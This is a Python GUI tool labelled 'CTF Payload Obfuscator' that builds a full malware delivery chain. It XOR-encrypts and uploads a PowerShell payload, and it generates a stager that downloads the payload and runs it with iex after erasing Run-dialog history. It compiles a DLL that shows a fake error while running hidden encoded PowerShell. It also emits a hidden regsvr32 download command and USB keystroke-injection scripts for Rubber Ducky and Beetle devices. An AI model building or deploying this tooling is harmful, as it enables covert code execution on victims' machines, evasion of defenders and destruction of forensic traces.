#!/usr/bin/env python3
import sys
import os
import base64
import subprocess
import random
import string
import tempfile
import requests
import json
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QLabel, QLineEdit, QTextEdit, QPushButton,
    QVBoxLayout, QHBoxLayout, QMessageBox, QCheckBox
)
from PyQt5.QtCore import Qt

# ----------------------------
# 3rd-party library
# ----------------------------
# pip install catbox-uploader PyQt5 requests
try:
    from catbox import CatboxUploader
except ImportError:
    print("Please install catbox-uploader: pip install catbox-uploader")
    sys.exit(1)

# ----------------------------
# Helper Functions
# ----------------------------

def generate_random_key(length=25):
    """Generate a random key from printable ASCII characters (roughly code 32..126)."""
    chars = ''.join(chr(i) for i in range(32, 127))
    return ''.join(random.choice(chars) for _ in range(length))

def xor_cipher(plaintext, key):
    """XOR cipher each character with the key, repeating the key if needed, then base64-encode the result."""
    result = []
    klen = len(key)
    for i, ch in enumerate(plaintext):
        xor_char = chr(ord(ch) ^ ord(key[i % klen]))
        result.append(xor_char)
    # Convert to bytes, then base64
    xor_bytes = ''.join(result).encode('utf-8')
    return base64.b64encode(xor_bytes).decode('utf-8')

def shorten_url_goolnk(full_url):
    """
    Shorten a URL using the goolnk service over RapidAPI,
    *without* a user-provided key (as requested).
    This may fail in production if the endpoint requires an API key.
    """
    api_url = "https://url-shortener-service.p.rapidapi.com/shorten"
    headers = {
        "x-rapidapi-host": "url-shortener-service.p.rapidapi.com",
        "Content-Type": "application/x-www-form-urlencoded",
        # We do NOT provide "x-rapidapi-key" here as per your request
    }
    payload = {"url": full_url}

    try:
        resp = requests.post(api_url, data=payload, headers=headers, timeout=15)
        resp.raise_for_status()
        data = resp.json()
        # possible keys: "result_url" or "shortUrl"
        if "result_url" in data:
            return data["result_url"]
        elif "shortUrl" in data:
            return data["shortUrl"]
        else:
            raise Exception("Unexpected goolnk response: " + str(data))
    except Exception as e:
        # If it fails, we just return the original URL
        return full_url

# ----------------------------
# Templates
# ----------------------------

STAGING_POST_TEMPLATE = r"""# ====================== Staging Post =============================

function dojob {
    param ([string]$sec,[string]$bty)
    $ajd = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($sec))
    $asg = ""
    for ($i = 0; $i -lt $ajd.Length; $i++) {
        $osn = [int]$ajd[$i] -bxor [int]$bty[$i % $bty.Length]
        $asg += [char]$osn
    }
    return $asg
}

if ($k.Length -eq 0){
    $k = irm "https://pastebin.com/raw/ySexKL9M"
}

$t = irm "LINK_GOES_HERE"
$isn = dojob -sec $t -bty $k

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
$isn | iex
"""

# This minimal snippet is then shortened
FINAL_PS_TEMPLATE = r"""$k='totalpwn';(irm "{SHORTURL}" | iex)"""

# The user-specified message is inserted in place of MESSAGEHERE,
# The base64-encoded final PS is inserted in place of BASE64GOESHERE
C_CODE_TEMPLATE = r"""
#include <windows.h>
#include <stdio.h>
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    return TRUE;
}
HRESULT __stdcall DllRegisterServer(void) {
    MessageBox(NULL, "MESSAGEHERE HRESULT: ERROR_09D1", "System Error (0x00060066e)", MB_OK | MB_ICONERROR);
    const char* encodedCommand = "BASE64GOESHERE";
    char command[512];
    snprintf(command, sizeof(command), "powershell -ep bypass -w h -e %s", encodedCommand);
    system(command);
    return S_OK;
}
"""

# The final Powershell command to download & regsvr32 the DLL
PS_DOWNLOAD_DLL_TEMPLATE = r"""powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "(Invoke-WebRequest -Uri '{CATBOXURL}' -OutFile '$env:TEMP\\{DLLNAME}'); Start-Process -FilePath 'regsvr32.exe' -ArgumentList '/s $env:TEMP\\{DLLNAME}'; Start-Sleep -s 3; Remove-Item -Force -Path '$env:TEMP\\{DLLNAME}'"
"""

# Minimal Rubber Ducky script
RUBBER_DUCKY_TEMPLATE = r"""DELAY 1000
GUI r
DELAY 200
STRING powershell
ENTER
DELAY 700
STRING POWERSHELLCOMMANDHERE
ENTER
DELAY 3000
ENTER
"""

# Minimal Beetle USB script
BEETLE_USB_TEMPLATE = r"""#include "Keyboard.h"

// Function to correctly type a character with Shift handling and USB flushing
void typeCharacter(char c) {
  bool useShift = false;
  char keyToPress = c;

  if (c >= 'A' && c <= 'Z') useShift = true;  
  else if (c == '!') { useShift = true; keyToPress = '1'; }
  else if (c == '@') { useShift = true; keyToPress = '2'; }
  else if (c == '#') { useShift = true; keyToPress = '3'; }
  else if (c == '$') { useShift = true; keyToPress = '4'; }
  else if (c == '%') { useShift = true; keyToPress = '5'; }
  else if (c == '^') { useShift = true; keyToPress = '6'; }
  else if (c == '&') { useShift = true; keyToPress = '7'; }
  else if (c == '*') { useShift = true; keyToPress = '8'; }
  else if (c == '(') { useShift = true; keyToPress = '9'; }
  else if (c == ')') { useShift = true; keyToPress = '0'; }
  else if (c == '_') { useShift = true; keyToPress = '-'; }
  else if (c == '+') { useShift = true; keyToPress = '='; }
  else if (c == '{') { useShift = true; keyToPress = '['; }
  else if (c == '}') { useShift = true; keyToPress = ']'; }
  else if (c == '|') { useShift = true; keyToPress = '\\'; }
  else if (c == ':') { useShift = true; keyToPress = ';'; }
  else if (c == '"') { useShift = true; keyToPress = '\''; }
  else if (c == '<') { useShift = true; keyToPress = ','; }
  else if (c == '>') { useShift = true; keyToPress = '.'; }
  else if (c == '?') { useShift = true; keyToPress = '/'; }
  else if (c == '~') { useShift = true; keyToPress = '`'; }

  if (useShift) {
    Keyboard.press(KEY_LEFT_SHIFT);
    delay(3);
    Keyboard.press(keyToPress);
    delay(3);
    Keyboard.release(keyToPress);
    delay(3);
    Keyboard.release(KEY_LEFT_SHIFT);
  } else {
    Keyboard.press(keyToPress);
    delay(3);
    Keyboard.release(keyToPress);
  }

  delay(5);
  Keyboard.releaseAll();
  Keyboard.end();
  delay(1);
  Keyboard.begin();
}

// Function to type a full string with proper handling
void typeString(const char *str) {
  while (*str) {
    typeCharacter(*str);
    str++;
  }
}

void setup() {
  delay(500);
  Keyboard.begin();

  // Open Run dialog (Windows + R)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(50);
  Keyboard.releaseAll();
  delay(200);

  // Type "powershell" and press Enter
  typeString("powershell");
  Keyboard.press(KEY_RETURN);
  delay(60);
  Keyboard.releaseAll();
  delay(1000);

  // Type the full PowerShell command
  typeString("POWERSHELLCOMMANDHERE");
  
  // Press Enter to execute
  Keyboard.press(KEY_RETURN);
  delay(50);
  Keyboard.releaseAll();
  
  delay(1000);

  // Press Enter again for redundancy
  Keyboard.press(KEY_RETURN);
  delay(3000);
  Keyboard.releaseAll();
}

void loop() {
  // No looping actions
}
"""

# ----------------------------
# Main GUI Application
# ----------------------------
class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("CTF Payload Obfuscator (No RapidAPI Key)")
        self.setMinimumSize(950, 750)

        # If you have a Catbox userhash, provide it here; otherwise blank is fine
        self.catbox = CatboxUploader()

        self._ciphered_payload = ""
        self._ciphered_payload_url = ""
        self._staging_post = ""
        self._staging_url = ""
        self._short_url = ""
        self._final_ps = ""
        self._final_ps_base64_utf16 = ""
        self._dll_path = None
        self._dll_url = None
        self._dll_name = "dontrun.dll"

        self.init_ui()

    def init_ui(self):
        main_widget = QWidget()
        self.setCentralWidget(main_widget)
        layout = QVBoxLayout()

        # Payload input
        layout.addWidget(QLabel("PowerShell Payload Script:"))
        self.payload_edit = QTextEdit()
        self.payload_edit.setPlaceholderText("Insert your PowerShell script here...")
        layout.addWidget(self.payload_edit)

        # XOR key input
        key_layout = QHBoxLayout()
        key_layout.addWidget(QLabel("XOR Key:"))
        self.key_line = QLineEdit()
        self.key_line.setPlaceholderText("Enter or generate a random key")
        key_layout.addWidget(self.key_line)
        gen_key_btn = QPushButton("Generate Key")
        gen_key_btn.clicked.connect(self.generate_xor_key)
        key_layout.addWidget(gen_key_btn)
        layout.addLayout(key_layout)

        # Custom message for the DLL
        layout.addWidget(QLabel("Custom DLL Message:"))
        self.custom_msg_line = QLineEdit()
        self.custom_msg_line.setPlaceholderText("Message to display in DLL's MessageBox (optional)")
        layout.addWidget(self.custom_msg_line)

        # DLL Name
        layout.addWidget(QLabel("DLL Filename (e.g. dontrun.dll):"))
        self.dllname_line = QLineEdit("dontrun.dll")
        layout.addWidget(self.dllname_line)

        # Checkboxes for output
        self.checkbox_rubber = QCheckBox("Generate Rubber Ducky Script")
        self.checkbox_beetle = QCheckBox("Generate Beetle USB Script")
        layout.addWidget(self.checkbox_rubber)
        layout.addWidget(self.checkbox_beetle)

        # Output Log
        layout.addWidget(QLabel("Log Output:"))
        self.log_edit = QTextEdit()
        self.log_edit.setReadOnly(True)
        layout.addWidget(self.log_edit)

        # Run All Button
        run_all_btn = QPushButton("Run All Steps")
        run_all_btn.clicked.connect(self.run_all_steps)
        layout.addWidget(run_all_btn)

        main_widget.setLayout(layout)

        # Dark style
        self.setStyleSheet("""
            QWidget {
                background-color: #2b2b2b;
                color: #ffffff;
                font-size: 12pt;
            }
            QLineEdit, QTextEdit {
                background-color: #3c3c3c;
                color: #ffffff;
                border: 1px solid #555555;
            }
            QPushButton {
                background-color: #555555;
                color: #ffffff;
                border: none;
                padding: 5px;
            }
            QPushButton:hover {
                background-color: #777777;
            }
            QCheckBox {
                spacing: 5px;
            }
        """)

    def log(self, msg):
        self.log_edit.append(msg)
        self.log_edit.verticalScrollBar().setValue(self.log_edit.verticalScrollBar().maximum())

    # ---------------------
    # Steps
    # ---------------------

    def generate_xor_key(self):
        new_key = generate_random_key()
        self.key_line.setText(new_key)
        self.log(f"Generated random XOR key: {new_key}")

    def encrypt_payload_xor(self):
        """XOR the payload with the key, then Base64-encode."""
        payload = self.payload_edit.toPlainText().strip()
        key = self.key_line.text().strip()
        if not payload or not key:
            raise ValueError("Payload and/or Key is empty. Please provide both.")
        self._ciphered_payload = xor_cipher(payload, key)
        self.log("Payload XOR-encrypted and base64-encoded.")

    def upload_ciphered_payload(self):
        """Upload the XOR+Base64-encoded payload to Catbox."""
        if not self._ciphered_payload:
            raise ValueError("No ciphered payload found to upload.")
        with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".txt") as tmp:
            tmp.write(self._ciphered_payload)
            tmp.flush()
            tmp_name = tmp.name
        try:
            link = self.catbox.upload_file(tmp_name)
            self._ciphered_payload_url = link
            self.log(f"Uploaded ciphered payload to Catbox: {link}")
        finally:
            if os.path.exists(tmp_name):
                os.remove(tmp_name)

    def generate_staging_script(self):
        """Fill in the template that downloads and decrypts the main payload."""
        if not self._ciphered_payload_url:
            raise ValueError("Ciphered payload URL is missing.")
        script = STAGING_POST_TEMPLATE.replace("LINK_GOES_HERE", self._ciphered_payload_url)
        self._staging_post = script
        self.log("Staging post script generated.")

    def upload_staging_script(self):
        """Upload the staging script to Catbox."""
        if not self._staging_post:
            raise ValueError("No staging script found to upload.")
        with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".ps1") as tmp:
            tmp.write(self._staging_post)
            tmp.flush()
            tmp_name = tmp.name
        try:
            link = self.catbox.upload_file(tmp_name)
            self._staging_url = link
            self.log(f"Staging script uploaded to Catbox: {link}")
        finally:
            if os.path.exists(tmp_name):
                os.remove(tmp_name)

    def shorten_staging_url(self):
        """Shorten the staging script URL using the no-key goolnk approach."""
        if not self._staging_url:
            raise ValueError("No staging URL to shorten.")
        self._short_url = shorten_url_goolnk(self._staging_url)
        if self._short_url == self._staging_url:
            self.log("Failed to shorten or no key required. Using original staging URL.")
        else:
            self.log(f"Shortened staging URL via goolnk: {self._short_url}")

    def build_final_ps(self):
        """Build the final minimal PS command, then encode with base64 UTF-16LE for embedding."""
        if not self._short_url:
            raise ValueError("No short (or original) URL found for final PS command.")
        final_ps = FINAL_PS_TEMPLATE.replace("{SHORTURL}", self._short_url)
        self._final_ps = final_ps
        # Now encode in Base64 with UTF-16LE
        utf16_bytes = final_ps.encode("utf-16le")
        self._final_ps_base64_utf16 = base64.b64encode(utf16_bytes).decode('utf-8')
        self.log("Built final PowerShell command and encoded in Base64 (UTF-16LE).")

    def build_and_compile_c(self):
        """Embed the final command into the C code template, compile into a DLL using gcc."""
        if not self._final_ps_base64_utf16:
            raise ValueError("No final PS command to embed in C code.")
        custom_msg = self.custom_msg_line.text().strip() or "MESSAGEHERE"
        self._dll_name = self.dllname_line.text().strip() or "dontrun.dll"

        c_code = C_CODE_TEMPLATE
        c_code = c_code.replace("MESSAGEHERE", custom_msg)
        c_code = c_code.replace("BASE64GOESHERE", self._final_ps_base64_utf16)

        # Save to code.c
        code_path = os.path.join(os.getcwd(), "code.c")
        with open(code_path, "w", encoding="utf-8") as f:
            f.write(c_code)

        # Compile with gcc
        try:
            cmd = ["gcc", "-shared", "-o", self._dll_name, "code.c"]
            self.log(f"Compiling DLL with: {' '.join(cmd)}")
            subprocess.run(cmd, check=True)
            self._dll_path = os.path.join(os.getcwd(), self._dll_name)
            self.log(f"Compiled DLL: {self._dll_path}")
        except subprocess.CalledProcessError as e:
            raise RuntimeError(f"GCC compilation failed: {e}")
        finally:
            if os.path.exists(code_path):
                os.remove(code_path)

    def upload_dll_to_catbox(self):
        """Upload the compiled DLL to Catbox."""
        if not self._dll_path or not os.path.exists(self._dll_path):
            raise ValueError("DLL file not found for upload.")
        try:
            link = self.catbox.upload_file(self._dll_path)
            self._dll_url = link
            self.log(f"Uploaded DLL to Catbox: {link}")
        except Exception as e:
            raise RuntimeError(f"Error uploading DLL: {str(e)}")

    def generate_final_ps_command(self):
        """Generate the final PowerShell command that downloads and registers the DLL, then cleans up."""
        if not self._dll_url:
            raise ValueError("DLL URL is missing; upload the DLL first.")
        self._dll_name = self.dllname_line.text().strip() or "dontrun.dll"

        command = PS_DOWNLOAD_DLL_TEMPLATE.replace("{CATBOXURL}", self._dll_url)
        command = command.replace("{DLLNAME}", self._dll_name)
        self.log("Final PowerShell command to run:\n" + command)
        return command

    def maybe_generate_rubber_ducky(self, ps_command):
        """If the user checked 'Generate Rubber Ducky Script', produce that minimal script."""
        if not self.checkbox_rubber.isChecked():
            return
        ducky_script = RUBBER_DUCKY_TEMPLATE.replace("POWERSHELLCOMMANDHERE", ps_command)
        self.log("\n==== Rubber Ducky Script ====\n" + ducky_script + "\n")

    def maybe_generate_beetle_usb(self, ps_command):
        """If the user checked 'Generate Beetle USB Script', produce that typed code script."""
        if not self.checkbox_beetle.isChecked():
            return
        # We only want to type the one-line powershell command, with quotes escaped if needed.
        # The snippet we produce is a direct replacement in the template.
        # For clarity, we insert the entire final command in place of "POWERSHELLCOMMANDHERE".
        # That means no second line about "powershell" or "ENTER" is needed inside it.
        # Because the template itself is set up to do "powershell" + "ENTER," then typed command.
        beetle_code = BEETLE_USB_TEMPLATE.replace("POWERSHELLCOMMANDHERE", ps_command)
        self.log("\n==== Beetle USB Script ====\n" + beetle_code + "\n")

    def run_all_steps(self):
        """Sequentially run each step with basic error handling."""
        self.log_edit.clear()
        self.log("Starting Full Obfuscation Workflow...\n")

        try:
            self.encrypt_payload_xor()
            self.upload_ciphered_payload()
            self.generate_staging_script()
            self.upload_staging_script()
            self.shorten_staging_url()
            self.build_final_ps()
            self.build_and_compile_c()
            self.upload_dll_to_catbox()
            final_ps_command = self.generate_final_ps_command()
            self.maybe_generate_rubber_ducky(final_ps_command)
            self.maybe_generate_beetle_usb(final_ps_command)
            self.log("\nAll steps completed successfully.")
        except Exception as e:
            self.log(f"\nError: {str(e)}")

# ----------------------------
# Main Application Entry
# ----------------------------
if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())
